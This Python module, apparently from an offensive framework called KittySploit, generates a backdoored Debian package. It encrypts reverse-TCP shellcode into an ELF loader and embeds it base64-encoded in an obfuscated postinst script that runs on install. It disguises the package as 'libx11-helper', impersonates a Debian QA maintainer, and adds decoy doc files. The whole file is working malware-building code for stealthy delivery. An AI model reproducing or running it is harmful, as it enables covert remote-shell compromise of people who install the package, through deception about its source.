#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Obfuscated Debian package with embedded loader.

Builds an encrypted ELF shellcode loader, embeds it base64-encoded in a postinst
script, and packages a .deb with innocuous metadata and decoy files.
"""

import base64
import shutil
from pathlib import Path

from kittysploit import *
from lib.compile.backdoor_helpers import generate_payload_bytes, option_value, report_payload_size
from lib.compile.deb_evasion_helpers import build_deb_package, build_obfuscated_postinst
from lib.compile.elf_shellcode_loader import ElfShellcodeLoaderBuilder
from lib.compile.linux_backdoor_helpers import compile_elf_bytes


class Module(Backdoor):
    __info__ = {
        "name": "Linux Debian Evasion Packaging",
        "description": (
            "Generate an obfuscated .deb package whose postinst decodes and executes "
            "an embedded encrypted ELF loader. Extends deb_packaging for stealth delivery."
        ),
        "author": "KittySploit",
        "platform": Platform.LINUX,
        "arch": Arch.X64,
    }

    payload_path = OptString(
        "payloads/stagers/linux/x64/reverse_tcp",
        "Payload module path (raw shellcode)",
        True,
    )
    lhost = OptString("127.0.0.1", "Connect-back IP address (reverse payloads)", True)
    lport = OptPort(4444, "Connect-back TCP port (reverse payloads)", True)
    encoder = OptString("", "Encoder module path (optional)", False)
    package_name = OptString("libx11-helper", "Debian package name", False)
    version = OptString("2.1.4", "Package version", False)
    maintainer = OptString("Debian QA <debian-qa@lists.debian.org>", "Maintainer field", False)
    description = OptString(
        "X11 helper utilities",
        "Short package description (shown in dpkg)",
        False,
    )
    install_path = OptString(
        "/usr/lib/x11/.cache/session-helper",
        "Path where postinst drops the loader on target",
        False,
    )
    cipher = OptChoice("chacha", "Shellcode encryption type", True, ["chacha", "rc4"])
    optimization = OptChoice(
        "ReleaseSmall",
        "Zig optimization level",
        False,
        ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"],
    )

    def __init__(self, framework=None):
        super().__init__()
        self.framework = framework

    def run(self):
        raw_payload = generate_payload_bytes(self)
        if not raw_payload:
            return False
        report_payload_size(raw_payload)

        builder = ElfShellcodeLoaderBuilder(
            cipher=str(option_value(self, "cipher") or "chacha").lower(),
            sleep_ms=0,
        )
        encoded, key, iv = builder.encrypt_payload(raw_payload)
        source = builder.build_source(encoded, key, iv)
        loader_elf = compile_elf_bytes(
            source=source,
            framework=getattr(self, "framework", None),
            optimization=str(option_value(self, "optimization") or "ReleaseSmall"),
        )
        if not loader_elf:
            print_error("Failed to compile embedded loader ELF for .deb package.")
            return False

        loader_b64 = base64.b64encode(loader_elf).decode("ascii")
        install_path = str(option_value(self, "install_path") or "/usr/lib/x11/.cache/session-helper")
        postinst = build_obfuscated_postinst(loader_b64=loader_b64, install_path=install_path)

        out_dir = Path(self.output_dir_path("backdoors/linux/evasion"))
        out_dir.mkdir(parents=True, exist_ok=True)
        package_name = str(option_value(self, "package_name") or "libx11-helper")
        version = str(option_value(self, "version") or "2.1.4")

        data_tree = out_dir / f"{package_name}_data"
        if data_tree.exists():
            shutil.rmtree(data_tree)
        (data_tree / "usr" / "share" / "doc" / package_name).mkdir(parents=True)
        (data_tree / "usr" / "share" / "doc" / package_name / "copyright").write_text(
            f"Format: https://www.debian.org/doc/packaging-manuals/copyright-format/1.0/\n"
            f"Upstream-Name: {package_name}\n"
            f"Source: KittySploit deb_evasion_packaging\n",
            encoding="utf-8",
        )
        (data_tree / "usr" / "share" / "doc" / package_name / "changelog").write_text(
            f"{package_name} ({version}) unstable; urgency=low\n\n"
            f"  * Maintenance update.\n\n",
            encoding="utf-8",
        )

        try:
            deb_path = build_deb_package(
                output_dir=out_dir,
                package_name=package_name,
                version=version,
                maintainer=str(option_value(self, "maintainer") or "Debian QA <debian-qa@lists.debian.org>"),
                description=str(option_value(self, "description") or "X11 helper utilities"),
                data_tree=data_tree,
                postinst=postinst,
            )
        finally:
            shutil.rmtree(data_tree, ignore_errors=True)

        if deb_path.is_file():
            print_success(f"Debian package generated: {deb_path} ({deb_path.stat().st_size} bytes)")
            print_info(
                f"Package: {package_name} {version} | Loader: {len(loader_elf)} bytes | "
                f"Install path: {install_path}"
            )
            print_info(f"Install: sudo dpkg -i {deb_path.name}")
            print_warning("Use only on authorized systems. Start a matching listener before installing.")
            return True

        print_error("Failed to build .deb package.")
        return False
